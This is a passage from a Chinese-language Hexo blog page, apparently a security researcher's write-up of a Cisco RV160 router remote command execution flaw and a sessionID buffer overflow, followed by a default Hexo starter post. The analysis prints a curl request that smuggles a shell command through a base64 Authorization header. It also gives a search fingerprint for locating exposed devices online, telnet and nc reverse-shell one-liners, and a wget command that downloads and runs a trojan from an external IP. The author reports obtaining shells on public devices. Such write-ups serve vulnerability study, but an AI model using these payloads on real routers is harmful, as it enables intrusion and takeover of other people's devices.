+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET -H &#x27;Authorization: Basic O3RvdWNoIC90bXAvaGFwcHloYWNraW5nOwoK&#x27; -i &#x27;http://192.168.214.130:8009/download/dniapi/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209223721558.png" alt="image-20211209223721558"></p>
+<p>断点到0x001b11c 处，可以看到我们拼接的字符串“ ;touch &#x2F;tmp&#x2F;happyhacking;”</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209224214203.png" alt="image-20211209224214203"></p>
+<p>执行完了之后，成功执行命令。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211209224458063.png" alt="image-20211209224458063"></p>
+<h2 id="公网测试"><a href="#公网测试" class="headerlink" title="公网测试"></a>公网测试</h2><p>公网设备指纹：在fofa上搜索 header&#x3D;”frame-ancestors ‘self’ ‘unsafe-inline’ ‘unsafe-eval’; script-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’; style-src ‘self’ ‘unsafe-inline’ ‘unsafe-eval’”</p>
+<p>经过测试，可以获取到shell。</p>
+<p>通过telnet 获取shell<br>;telnet ip port1 | &#x2F;bin&#x2F;sh | telnet ip port2;</p>
+<p>通过nc 获取shell,nc 没有-e 的功能。<br>;nc ip port1 | &#x2F;bin&#x2F;sh | nc ip port2;</p>
+<p>通过木马程序获取shell</p>
+<p>设备的指令架构为armv7L</p>
+<p>;wget <a target="_blank" rel="noopener" href="http://8.141.70.26:9008/chell_armv7L">http://8.141.70.26:9008/chell_armv7L</a> -O &#x2F;tmp&#x2F;qqqqq;chmod 777 &#x2F;tmp&#x2F;qqqqq;.&#x2F;chell_armv7L 8.141.70.26 9004;</p>
+<h2 id="缓冲区溢出漏洞分析"><a href="#缓冲区溢出漏洞分析" class="headerlink" title="缓冲区溢出漏洞分析"></a>缓冲区溢出漏洞分析</h2><p>在handle_request 函数中有如下代码，获取cookies 的值</p>
+<blockquote>
+<p>定义函数：int strncasecmp(const char *s1, const char *s2, size_t n);</p>
+<p>函数说明：strncasecmp()用来比较参数s1 和s2 字符串前n个字符，比较时会自动忽略大小写的差异。</p>
+<p>返回值：若参数s1 和s2 字符串相同则返回0。s1 若大于s2 则返回大于0 的值，s1 若小于s2 则返回小于0 的值。</p>
+<p>定义函数： size_t strspn(const char *str1,const char *str2)</p>
+<p>函数说明： 检索字符串str1中第一个不在字符串str2中出现的字符下标</p>
+<p>返回值：该函数返回str1中第一个不在字符串str2中出现的字符下标</p>
+</blockquote>
+<p>下图的代码的意思是，先判断字符串中存在“Cookie: ” 字符串，如果有，那就获取cookes 的值。strspn(s1+7,”\t”) 的意思是获取cookies 的值最后的下标。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211210155658793.png" alt="image-20211210155658793"></p>
+<p>接下来看那个函数是用来cookies 的值。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211210161633200.png" alt="image-20211210161633200"></p>
+<p>但是在哪之前，sub_169F0()函数，这个函数是用来判断当前请求的url资源内容是否需要登录才能访问。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212212120467.png" alt="image-20211212212120467"></p>
+<p>进入到sub_1625C函数中，a1 的值是cookies ，代码是判断cookies 不为空就进入到sub_16138函数。</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212222952416.png" alt="image-20211212222952416"></p>
+<p>进入到sub_16138函数中。从这个函数中，可以看出来，这个函数是获取cookeis 的值中的sessionID 的值。</p>
+<blockquote>
+<p>char *strstr(const char *haystack, const char *needle)** 在字符串 <strong>haystack</strong> 中查找第一次出现字符串 <strong>needle</strong> 的位置，不包含终止符 ‘\0’</p>
+<p>char *strtok(char *str, const char *delim) 分解字符串str为一组字符串，delim为分隔符。delim 包含分隔符的C字符串。</p>
+<p>返回值：该函数返回被分解的第一个字符串，如果没有可检索的字符串，则返回一个空指针。</p>
+</blockquote>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212223526769.png" alt="image-20211212223526769"></p>
+<p>sub_15CE4()函数中，形参a2 指向空字符，所以其实最后就是未限制sessionID长度在strcpy时的溢出</p>
+<p><img src="/23__CiscoRv160%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.assets/image-20211212232211788.png" alt="image-20211212232211788"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Cisco RV160W 系列路由器漏洞：从1day 分析到0day挖掘</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8qviTeiuJb5XU8jDdHMW8Q">https://mp.weixin.qq.com/s/8qviTeiuJb5XU8jDdHMW8Q</a></p>
+<p>bindiff 文件对比参考RX40 的文章</p>
+<p>交叉编译出和这个固件相同的ARM EABI5。使用的交叉工具链为arm-linux-gnueabihf-gcc</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xukai871105/article/details/37345857">https://blog.csdn.net/xukai871105/article/details/37345857</a></p>
+<p>使用qemu chroot 进行固件本地调试</p>
+<p><a target="_blank" rel="noopener" href="http://blog.nsfocus.net/qemu-chroot/">http://blog.nsfocus.net/qemu-chroot/</a></p>
+<p>mount 挂载的相关资料</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9015312.html">https://www.cnblogs.com/sparkdev/p/9015312.html</a></p>
+<p>ARM 汇编NOP指令的二进制</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhangmiaoping23/article/details/43309455">https://blog.csdn.net/zhangmiaoping23/article/details/43309455</a></p>
+<p>curl  详解</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/aftree/p/9293071.html">https://www.cnblogs.com/aftree/p/9293071.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tig3rhu.github.io/2023/12/15/Cisco%20Rv160%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clq9l1r3r0003ysvbgoow094i" data-title="Cisco Rv160 远程命令执行漏洞分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/15/hello-world/" class="article-date">
+  <time class="dt-published" datetime="2023-12-15T07:15:35.033Z" itemprop="datePublished">2023-12-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/15/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><p><img src="/pic/1280310.png" alt="img"></p>
+<p>asa<br><img src="/pic_test/1280310.png" alt="img"></p>
+<p>asdasda</p>
+<p><img src="/../../source/images/pic_test/1280310.png" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tig3rhu.github.io/2023/12/15/hello-world/" data-id="clq9l1r3z000bysvbbwca28e2" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/01/03/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP/">apk逆向__婚礼纪逆向</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/02/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95/">Android各种机型刷机踩坑记录</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/02/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91/">apk逆向__懒人驾考去会员</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/02/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98/">apk逆向__滴答清单去会员</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/18/45__%E8%93%9D%E7%89%99%20sniff%20&%20CTF/">蓝牙sniff&amp;CTF&amp;develop</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 Tig3rHu<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
 </body>
 </html>
